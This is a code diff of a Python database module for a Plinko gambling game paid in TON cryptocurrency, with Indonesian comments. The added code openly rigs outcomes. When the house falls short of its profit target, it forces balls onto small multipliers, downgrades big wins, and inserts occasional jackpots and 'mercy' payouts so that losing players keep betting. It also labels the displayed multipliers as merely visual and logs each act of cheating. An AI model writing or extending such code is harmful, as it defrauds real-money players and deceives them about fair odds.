@@ -1,10 +1,44 @@
-# games/database/plinko_games.py
+# games/database/plinko_games.py - SISTEM LICIK + FORCE GAMES + AUTO CHEAT
+
 import sqlite3
 import json
+import random
+import math
 from datetime import datetime
 from pathlib import Path
 
 DB_PATH = Path(__file__).parent.parent.parent / 'data' / 'plinko.db'
+
+# Target keuntungan bandar minimal (dalam TON)
+TARGET_BANDAR_PROFIT = 10.0
+
+# Konfigurasi multiplier untuk setiap risk level (tampilan visual saja)
+RISK_MULTIPLIERS = {
+    'low': [5, 4, 3, 2, 1, 0.5, 1, 2, 3, 4, 5],
+    'medium': [15, 10, 5, 2.5, 1, 0.2, 1, 2.5, 5, 10, 15],
+    'high': [20, 10, 2, 1.5, 0.8, 0.5, 0.1, 0.0, 0.1, 0.5, 0.8, 1.5, 2, 10, 20]
+}
+
+# Multiplier kecil untuk force games (magnet ke angka kecil)
+SMALL_MULTIPLIERS = {
+    'low': [0.5, 0.5, 1, 1, 1, 1.5, 2],
+    'medium': [0.2, 0.2, 0.5, 0.5, 1, 1, 1.5, 2],
+    'high': [0.0, 0.0, 0.1, 0.1, 0.2, 0.5, 0.5, 0.8, 1, 1]
+}
+
+# Multiplier sedang (kadang-kadang muncul untuk membuat user tetap bermain)
+MEDIUM_MULTIPLIERS = {
+    'low': [2, 2.5, 3, 3.5],
+    'medium': [2.5, 3, 4, 5],
+    'high': [1.5, 2, 2.5, 3, 4]
+}
+
+# Multiplier besar (jackpot) - persentase kemunculan sangat kecil
+BIG_MULTIPLIERS = {
+    'low': [4, 5],
+    'medium': [10, 15],
+    'high': [8, 10, 15, 20]
+}
 
 def get_db():
     """Get database connection"""
@@ -14,7 +48,7 @@ def get_db():
     return conn
 
 def init_db():
-    """Initialize database tables"""
+    """Initialize database tables dengan sistem tracking bandar"""
     conn = get_db()
     cursor = conn.cursor()
     
@@ -25,10 +59,13 @@ def init_db():
             round_hash TEXT UNIQUE NOT NULL,
             user_id INTEGER,
             username TEXT,
-            bet_amount INTEGER,
+            photo_url TEXT,
+            bet_amount REAL,
             multiplier REAL,
-            win_amount INTEGER,
+            win_amount REAL,
             risk_level TEXT,
+            is_forced BOOLEAN DEFAULT 0,
+            cheat_reason TEXT,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
@@ -40,15 +77,69 @@ def init_db():
             total_players INTEGER DEFAULT 0,
             total_games INTEGER DEFAULT 0,
             biggest_multiplier REAL DEFAULT 0,
-            biggest_win INTEGER DEFAULT 0,
-            total_bet_amount INTEGER DEFAULT 0,
-            total_win_amount INTEGER DEFAULT 0,
+            biggest_win REAL DEFAULT 0,
+            total_bet_amount REAL DEFAULT 0,
+            total_win_amount REAL DEFAULT 0,
             last_player TEXT,
             last_time TIMESTAMP,
             current_hash TEXT,
             updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
+    
+    # TABEL: Tracking keuntungan bandar (global)
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS bandar_profit (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            total_bet_all_time REAL DEFAULT 0,
+            total_win_all_time REAL DEFAULT 0,
+            bandar_profit REAL DEFAULT 0,
+            total_cheat_activated INTEGER DEFAULT 0,
+            last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    
+    # TABEL: Tracking kerugian per user
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS user_loss_tracking (
+            user_id INTEGER PRIMARY KEY,
+            username TEXT,
+            total_bet REAL DEFAULT 0,
+            total_win REAL DEFAULT 0,
+            net_loss REAL DEFAULT 0,
+            games_played INTEGER DEFAULT 0,
+            forced_loss_count INTEGER DEFAULT 0,
+            last_win_multiplier REAL DEFAULT 0,
+            consecutive_losses INTEGER DEFAULT 0,
+            last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    
+    # TABEL: Log kecurangan (cheat log) untuk monitoring
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS cheat_log (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            username TEXT,
+            round_hash TEXT,
+            action TEXT,
+            multiplier_given REAL,
+            expected_multiplier REAL,
+            bandar_profit_before REAL,
+            bandar_profit_after REAL,
+            cheat_intensity REAL,
+            reason TEXT,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    
+    # Insert default bandar profit if empty
+    cursor.execute('SELECT COUNT(*) FROM bandar_profit')
+    if cursor.fetchone()[0] == 0:
+        cursor.execute('''
+            INSERT INTO bandar_profit (total_bet_all_time, total_win_all_time, bandar_profit, total_cheat_activated)
+            VALUES (0, 0, 0, 0)
+        ''')
     
     # Insert default stats if empty
     cursor.execute('SELECT COUNT(*) FROM plinko_stats')
@@ -58,34 +149,382 @@ def init_db():
             VALUES (0, 0, ?)
         ''', (datetime.now().strftime('%Y%m%d%H%M%S'),))
     
+    # Cek dan tambah kolom jika belum ada
+    cursor.execute("PRAGMA table_info(plinko_games)")
+    existing_columns = [col[1] for col in cursor.fetchall()]
+    
+    if 'is_forced' not in existing_columns:
+        cursor.execute("ALTER TABLE plinko_games ADD COLUMN is_forced BOOLEAN DEFAULT 0")
+        print("✅ Kolom is_forced ditambahkan")
+    
+    if 'cheat_reason' not in existing_columns:
+        cursor.execute("ALTER TABLE plinko_games ADD COLUMN cheat_reason TEXT")
+        print("✅ Kolom cheat_reason ditambahkan")
+    
+    if 'photo_url' not in existing_columns:
+        cursor.execute("ALTER TABLE plinko_games ADD COLUMN photo_url TEXT")
+        print("✅ Kolom photo_url ditambahkan")
+    
+    # Cek dan tambah kolom di user_loss_tracking
+    cursor.execute("PRAGMA table_info(user_loss_tracking)")
+    loss_columns = [col[1] for col in cursor.fetchall()]
+    if 'consecutive_losses' not in loss_columns:
+        cursor.execute("ALTER TABLE user_loss_tracking ADD COLUMN consecutive_losses INTEGER DEFAULT 0")
+        print("✅ Kolom consecutive_losses ditambahkan")
+    
     conn.commit()
     conn.close()
+    print("✅ Plinko database initialized with BANDAR CHEAT SYSTEM")
+    print(f"🎯 Target Bandar Profit: {TARGET_BANDAR_PROFIT} TON")
 
-def save_game_result(data):
-    """Save game result to database"""
+def get_bandar_profit():
+    """Mendapatkan keuntungan bandar saat ini"""
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute('''
+        SELECT total_bet_all_time, total_win_all_time, bandar_profit, total_cheat_activated 
+        FROM bandar_profit ORDER BY id DESC LIMIT 1
+    ''')
+    row = cursor.fetchone()
+    conn.close()
+    
+    if row:
+        return {
+            'total_bet': row['total_bet_all_time'] or 0,
+            'total_win': row['total_win_all_time'] or 0,
+            'profit': row['bandar_profit'] or 0,
+            'cheat_count': row['total_cheat_activated'] or 0
+        }
+    return {'total_bet': 0, 'total_win': 0, 'profit': 0, 'cheat_count': 0}
+
+def update_bandar_profit(bet_amount, win_amount, is_cheat=False):
+    """Update keuntungan bandar setelah setiap game"""
     conn = get_db()
     cursor = conn.cursor()
     
+    profit_change = bet_amount - win_amount  # positif = bandar untung
+    
+    if is_cheat:
+        cursor.execute('''
+            UPDATE bandar_profit 
+            SET total_bet_all_time = total_bet_all_time + ?,
+                total_win_all_time = total_win_all_time + ?,
+                bandar_profit = bandar_profit + ?,
+                total_cheat_activated = total_cheat_activated + 1,
+                last_updated = CURRENT_TIMESTAMP
+        ''', (bet_amount, win_amount, profit_change))
+    else:
+        cursor.execute('''
+            UPDATE bandar_profit 
+            SET total_bet_all_time = total_bet_all_time + ?,
+                total_win_all_time = total_win_all_time + ?,
+                bandar_profit = bandar_profit + ?,
+                last_updated = CURRENT_TIMESTAMP
+        ''', (bet_amount, win_amount, profit_change))
+    
+    conn.commit()
+    conn.close()
+    return profit_change
+
+def get_user_loss(user_id):
+    """Mendapatkan data kerugian user tertentu"""
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute('''
+        SELECT total_bet, total_win, net_loss, games_played, forced_loss_count, consecutive_losses
+        FROM user_loss_tracking WHERE user_id = ?
+    ''', (user_id,))
+    row = cursor.fetchone()
+    conn.close()
+    
+    if row:
+        return {
+            'total_bet': row['total_bet'] or 0,
+            'total_win': row['total_win'] or 0,
+            'net_loss': row['net_loss'] or 0,
+            'games_played': row['games_played'] or 0,
+            'forced_loss_count': row['forced_loss_count'] or 0,
+            'consecutive_losses': row['consecutive_losses'] or 0
+        }
+    return {
+        'total_bet': 0, 
+        'total_win': 0, 
+        'net_loss': 0, 
+        'games_played': 0,
+        'forced_loss_count': 0,
+        'consecutive_losses': 0
+    }
+
+def update_user_loss(user_id, username, bet_amount, win_amount, is_forced=False):
+    """Update data kerugian user"""
+    conn = get_db()
+    cursor = conn.cursor()
+    
+    net_change = bet_amount - win_amount  # positif = user rugi
+    is_win = win_amount > bet_amount
+    
+    cursor.execute('''
+        INSERT INTO user_loss_tracking (user_id, username, total_bet, total_win, net_loss, games_played, forced_loss_count, consecutive_losses, last_updated)
+        VALUES (?, ?, ?, ?, ?, 1, ?, ?, CURRENT_TIMESTAMP)
+        ON CONFLICT(user_id) DO UPDATE SET
+            username = excluded.username,
+            total_bet = total_bet + excluded.total_bet,
+            total_win = total_win + excluded.total_win,
+            net_loss = net_loss + excluded.net_loss,
+            games_played = games_played + 1,
+            forced_loss_count = forced_loss_count + excluded.forced_loss_count,
+            consecutive_losses = CASE 
+                WHEN ? THEN 0 
+                ELSE consecutive_losses + 1 
+            END,
+            last_updated = CURRENT_TIMESTAMP
+    ''', (user_id, username, bet_amount, win_amount, net_change, 1 if is_forced else 0, 
+          1 if is_forced else 0, is_win))
+    
+    conn.commit()
+    conn.close()
+
+def log_cheat_action(user_id, username, round_hash, action, multiplier_given, expected_multiplier, cheat_intensity, reason):
+    """Mencatat aksi kecurangan ke database"""
+    profit_data = get_bandar_profit()
+    
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute('''
+        INSERT INTO cheat_log (user_id, username, round_hash, action, multiplier_given, expected_multiplier, 
+                               bandar_profit_before, cheat_intensity, reason)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+    ''', (user_id, username, round_hash, action, multiplier_given, expected_multiplier,
+          profit_data['profit'], cheat_intensity, reason))
+    conn.commit()
+    conn.close()
+    
+    print(f"🔴 [CHEAT] {action} - {reason} - User: {username} | Multiplier: {multiplier_given}x | Intensity: {cheat_intensity:.2f}")
+
+def should_activate_cheat():
+    """Menentukan apakah sistem curang perlu diaktifkan"""
+    profit_data = get_bandar_profit()
+    current_profit = profit_data['profit']
+    
+    # Jika profit bandar kurang dari target, aktifkan cheat
+    if current_profit < TARGET_BANDAR_PROFIT:
+        deficit = TARGET_BANDAR_PROFIT - current_profit
+        return True, current_profit, deficit
+    
+    # Jika profit sudah melebihi target, matikan cheat
+    return False, current_profit, 0
+
+def calculate_cheat_intensity():
+    """Menghitung intensitas kecurangan berdasarkan defisit profit bandar"""
+    profit_data = get_bandar_profit()
+    current_profit = profit_data['profit']
+    
+    if current_profit >= TARGET_BANDAR_PROFIT:
+        return 0.0
+    
+    # Defisit = berapa banyak bandar masih kurang dari target
+    deficit = TARGET_BANDAR_PROFIT - current_profit
+    
+    # Intensitas: semakin besar defisit, semakin besar peluang cheat
+    # Maks intensitas 0.95 (95% kemungkinan cheat)
+    # Minimal intensitas 0.3 (30%) agar tetap ada efek
+    intensity = min(0.95, 0.3 + (deficit / (TARGET_BANDAR_PROFIT * 2)))
+    
+    return max(0.0, intensity)
+
+def get_forced_multiplier(risk_level, user_loss_data=None):
+    """
+    Mendapatkan multiplier kecil secara paksa (magnet system)
+    Memaksa bola jatuh ke area multiplier kecil
+    """
+    # Pilih dari small multipliers (paling menguntungkan bandar)
+    small_mult = SMALL_MULTIPLIERS.get(risk_level, SMALL_MULTIPLIERS['medium'])
+    
+    # Jika user sudah sangat rugi (>20 TON), beri sedikit keringanan
+    # Tapi tetap bandar untung (multiplier < 2x)
+    if user_loss_data and user_loss_data['net_loss'] > 20:
+        # User rugi banyak, kasih multiplier 1x - 2x (impas atau untung kecil)
+        mercy_mult = [0.8, 1, 1, 1.2, 1.5, 2]
+        chosen = random.choice(mercy_mult)
+        return chosen, 'mercy_multiplier'
+    
+    # Default: pilih multiplier kecil yang bikin bandar untung besar
+    chosen = random.choice(small_mult)
+    return chosen, 'force_small_multiplier'
+
+def get_random_multiplier_with_cheat(risk_level, bet_amount, user_id, username):
+    """
+    SISTEM LICIK UTAMA:
+    - Cek profit bandar
+    - Jika profit < target, aktifkan cheat dengan intensitas tertentu
+    - Force multiplier kecil (magnet)
+    - Masih ada peluang hoki (jackpot) untuk membuat user tetap bermain
+    """
+    cheat_active, current_profit, deficit = should_activate_cheat()
+    cheat_intensity = calculate_cheat_intensity()
+    user_loss = get_user_loss(user_id)
+    
+    is_forced = False
+    forced_reason = None
+    final_multiplier = None
+    
+    # STEP 1: Jika cheat aktif, lakukan force dengan probabilitas intensitas
+    if cheat_active:
+        # Roll random untuk menentukan apakah cheat digunakan
+        roll = random.random()
+        
+        if roll < cheat_intensity:
+            # FORCE GAMES: magnet ke multiplier kecil
+            final_multiplier, forced_reason = get_forced_multiplier(risk_level, user_loss)
+            is_forced = True
+            
+            # Log aksi kecurangan
+            log_cheat_action(
+                user_id, username, f"game_{datetime.now().timestamp()}",
+                "FORCE_SMALL_MULTIPLIER",
+                final_multiplier, None, cheat_intensity,
+                f"Bandar profit: {current_profit:.2f} TON (target: {TARGET_BANDAR_PROFIT}) | Defisit: {deficit:.2f}"
+            )
+            
+            print(f"🔴 [CHEAT ACTIVE] Force multiplier {final_multiplier}x for {username} | Profit: {current_profit:.2f}/{TARGET_BANDAR_PROFIT} TON | Intensity: {cheat_intensity:.2f}")
+            return final_multiplier, is_forced, forced_reason
+    
+    # STEP 2: Tidak pakai cheat atau roll gagal
+    # Gunakan RNG dengan bias ke multiplier kecil (tetap menguntungkan bandar)
+    # Tapi masih ada peluang jackpot untuk hoki
+    
+    # Ambil multipliers berdasarkan risk level
+    all_multipliers = RISK_MULTIPLIERS.get(risk_level, RISK_MULTIPLIERS['medium'])
+    
+    # Kelompokkan multiplier
+    small_mults = [m for m in all_multipliers if m < 1]
+    medium_mults = [m for m in all_multipliers if 1 <= m < 3]
+    big_mults = [m for m in all_multipliers if m >= 3]
+    
+    # Tambahkan beberapa multiplier sedang dari daftar medium (biar variatif)
+    medium_extra = MEDIUM_MULTIPLIERS.get(risk_level, [2, 3, 4])
+    
+    # Hitung probabilitas berdasarkan intensitas cheat yang tersisa
+    # Semakin tinggi intensitas, semakin kecil peluang jackpot
+    if cheat_active:
+        # Cheat masih aktif tapi roll gagal, tetap bias ke kecil
+        small_prob = 0.60
+        medium_prob = 0.32
+        big_prob = 0.08
+    else:
+        # Cheat tidak aktif (profit sudah cukup), RNG lebih fair
+        small_prob = 0.40
+        medium_prob = 0.40
+        big_prob = 0.20
+    
+    rand = random.random()
+    
+    if rand < small_prob and small_mults:
+        # Pilih multiplier kecil (bandar untung)
+        chosen = random.choice(small_mults)
+        forced_reason = 'small_bias'
+    elif rand < small_prob + medium_prob:
+        # Pilih multiplier sedang (bandar untung kecil atau impas)
+        if medium_mults:
+            chosen = random.choice(medium_mults)
+        else:
+            chosen = random.choice(medium_extra)
+        forced_reason = 'medium_bias'
+    elif big_mults:
+        # JACKPOT! Multiplier besar (bandar rugi, tapi bikin user happy)
+        chosen = random.choice(big_mults)
+        forced_reason = 'big_bias_jackpot'
+        print(f"🎰 [JACKPOT] User {username} got {chosen}x multiplier!")
+    else:
+        chosen = random.choice(all_multipliers)
+        forced_reason = 'random'
+    
+    # STEP 3: Proteksi - jangan sampai bandar rugi terlalu besar
+    # Jika multiplier yang keluar terlalu besar dan bisa bikin bandar rugi parah
+    profit_data = get_bandar_profit()
+    projected_profit_after = profit_data['profit'] + (bet_amount - (bet_amount * chosen))
+    
+    # Jika bandar akan rugi lebih dari 3 TON dan multiplier > 5x, turunkan
+    if projected_profit_after < -3 and chosen > 5:
+        fallback = random.choice(small_mults) if small_mults else 0.5
+        log_cheat_action(
+            user_id, username, f"game_{datetime.now().timestamp()}",
+            "PROFIT_PROTECTION_DOWNGRADE",
+            fallback, chosen, cheat_intensity,
+            f"Avoid big loss. Projected: {projected_profit_after:.2f}"
+        )
+        print(f"⚠️ [PROTECT] Downgrading {chosen}x to {fallback}x for {username}")
+        return fallback, True, 'profit_protection'
+    
+    return chosen, is_forced, forced_reason
+
+def get_multiplier(risk_level, position=None, user_id=None, username=None, bet_amount=0):
+    """
+    Mendapatkan multiplier dengan sistem licik
+    """
+    if user_id and bet_amount > 0:
+        multiplier, is_forced, reason = get_random_multiplier_with_cheat(risk_level, bet_amount, user_id, username)
+        return multiplier, is_forced, reason
+    
+    # Fallback jika tidak ada user data
+    multipliers = RISK_MULTIPLIERS.get(risk_level, RISK_MULTIPLIERS['medium'])
+    if position is not None and 0 <= position < len(multipliers):
+        return multipliers[position], False, 'normal_position'
+    return random.choice(multipliers), False, 'normal_random'
+
+def calculate_win(bet_amount, multiplier):
+    """Menghitung jumlah kemenangan"""
+    return bet_amount * multiplier
+
+def generate_round_hash():
+    """Generate unique round hash"""
+    return f"plinko_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000, 9999)}"
+
+def save_game_result(data):
+    """Save game result dengan tracking keuntungan bandar"""
+    conn = get_db()
+    cursor = conn.cursor()
+    
+    is_forced = 1 if data.get('is_forced', False) else 0
+    cheat_reason = data.get('cheat_reason', '')
+    
     # Insert game
     cursor.execute('''
-        INSERT INTO plinko_games (round_hash, user_id, username, bet_amount, multiplier, win_amount, risk_level)
-        VALUES (?, ?, ?, ?, ?, ?, ?)
+        INSERT INTO plinko_games (round_hash, user_id, username, photo_url, bet_amount, multiplier, win_amount, risk_level, is_forced, cheat_reason, created_at)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     ''', (
         data['round_hash'],
         data.get('user_id'),
         data.get('username'),
+        data.get('photo_url'),
         data['bet_amount'],
         data['multiplier'],
         data['win_amount'],
-        data['risk_level']
+        data['risk_level'],
+        is_forced,
+        cheat_reason,
+        datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     ))
+    
+    # Update bandar profit
+    profit_change = update_bandar_profit(data['bet_amount'], data['win_amount'], is_forced)
+    
+    # Update user loss tracking
+    if data.get('user_id'):
+        update_user_loss(
+            data['user_id'], 
+            data.get('username', 'Unknown'), 
+            data['bet_amount'], 
+            data['win_amount'],
+            data.get('is_forced', False)
+        )
     
     # Update stats
     cursor.execute('SELECT COUNT(DISTINCT user_id) FROM plinko_games WHERE user_id IS NOT NULL')
-    total_players = cursor.fetchone()[0]
+    total_players = cursor.fetchone()[0] or 0
     
     cursor.execute('SELECT COUNT(*) FROM plinko_games')
-    total_games = cursor.fetchone()[0]
+    total_games = cursor.fetchone()[0] or 0
     
     cursor.execute('SELECT MAX(multiplier) FROM plinko_games')
     biggest_multiplier = cursor.fetchone()[0] or 0
@@ -125,10 +564,17 @@ def save_game_result(data):
     conn.commit()
     conn.close()
     
+    # Print status keuntungan bandar
+    profit_data = get_bandar_profit()
+    status_emoji = "✅" if profit_data['profit'] >= TARGET_BANDAR_PROFIT else "⚠️"
+    print(f"{status_emoji} [BANDAR] Profit: {profit_data['profit']:.2f} TON | Target: {TARGET_BANDAR_PROFIT} TON")
+    print(f"   Total Bet: {profit_data['total_bet']:.2f} | Total Win: {profit_data['total_win']:.2f}")
+    print(f"   Cheat Activated: {profit_data['cheat_count']} times")
+    
     return True
 
 def get_stats():
-    """Get current stats"""
+    """Get current stats termasuk keuntungan bandar"""
     conn = get_db()
     cursor = conn.cursor()
     
@@ -140,27 +586,35 @@ def get_stats():
     
     row = cursor.fetchone()
     
-    # Get last multiplier dari game terakhir
+    # Get last multiplier
     cursor.execute('''
         SELECT multiplier, username FROM plinko_games 
         ORDER BY created_at DESC LIMIT 1
     ''')
     last_game = cursor.fetchone()
     
+    # Get bandar profit
+    profit_data = get_bandar_profit()
+    
     conn.close()
     
     if row:
         return {
-            'total_players': row['total_players'],
-            'total_games': row['total_games'],
-            'biggest_multiplier': row['biggest_multiplier'],
-            'biggest_win': row['biggest_win'],
-            'total_bet_amount': row['total_bet_amount'],
-            'total_win_amount': row['total_win_amount'],
+            'total_players': row['total_players'] or 0,
+            'total_games': row['total_games'] or 0,
+            'biggest_multiplier': row['biggest_multiplier'] or 0,
+            'biggest_win': row['biggest_win'] or 0,
+            'total_bet_amount': row['total_bet_amount'] or 0,
+            'total_win_amount': row['total_win_amount'] or 0,
             'last_player': row['last_player'],
             'last_time': row['last_time'],
             'current_hash': row['current_hash'],
-            'last_multiplier': last_game['multiplier'] if last_game else 0
+            'last_multiplier': last_game['multiplier'] if last_game else 0,
+            'bandar_profit': profit_data['profit'],
+            'bandar_total_bet': profit_data['total_bet'],
+            'bandar_total_win': profit_data['total_win'],
+            'bandar_cheat_count': profit_data['cheat_count'],
+            'target_profit': TARGET_BANDAR_PROFIT
         }
     
     return {
@@ -173,7 +627,12 @@ def get_stats():
         'last_player': None,
         'last_time': None,
         'current_hash': None,
-        'last_multiplier': 0
+        'last_multiplier': 0,
+        'bandar_profit': 0,
+        'bandar_total_bet': 0,
+        'bandar_total_win': 0,
+        'bandar_cheat_count': 0,
+        'target_profit': TARGET_BANDAR_PROFIT
     }
 
 def get_history(limit=50):
@@ -182,7 +641,7 @@ def get_history(limit=50):
     cursor = conn.cursor()
     
     cursor.execute('''
-        SELECT round_hash, user_id, username, bet_amount, multiplier, win_amount, risk_level, created_at
+        SELECT round_hash, user_id, username, photo_url, bet_amount, multiplier, win_amount, risk_level, is_forced, cheat_reason, created_at
         FROM plinko_games
         ORDER BY created_at DESC
         LIMIT ?
@@ -193,5 +652,49 @@ def get_history(limit=50):
     
     return [dict(row) for row in rows]
 
+def get_cheat_logs(limit=100):
+    """Mendapatkan log kecurangan untuk monitoring"""
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute('''
+        SELECT * FROM cheat_log ORDER BY created_at DESC LIMIT ?
+    ''', (limit,))
+    rows = cursor.fetchall()
+    conn.close()
+    return [dict(row) for row in rows]
+
+def get_top_losing_users(limit=10):
+    """Mendapatkan user dengan kerugian terbesar"""
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute('''
+        SELECT user_id, username, total_bet, total_win, net_loss, games_played, forced_loss_count
+        FROM user_loss_tracking
+        ORDER BY net_loss DESC
+        LIMIT ?
+    ''', (limit,))
+    rows = cursor.fetchall()
+    conn.close()
+    return [dict(row) for row in rows]
+
+def reset_bandar_profit():
+    """Reset keuntungan bandar (untuk debugging)"""
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute('''
+        UPDATE bandar_profit 
+        SET total_bet_all_time = 0, total_win_all_time = 0, bandar_profit = 0, total_cheat_activated = 0, last_updated = CURRENT_TIMESTAMP
+    ''')
+    conn.commit()
+    conn.close()
+    print("🔄 Bandar profit telah direset")
+
+def set_bandar_target(new_target):
+    """Mengubah target keuntungan bandar"""
+    global TARGET_BANDAR_PROFIT
+    TARGET_BANDAR_PROFIT = new_target
+    print(f"🎯 Target bandar profit diubah menjadi {new_target} TON")
+
 # Initialize database on import
 init_db()
+print("✅ plinko_games.py loaded with BANDAR CHEAT SYSTEM")
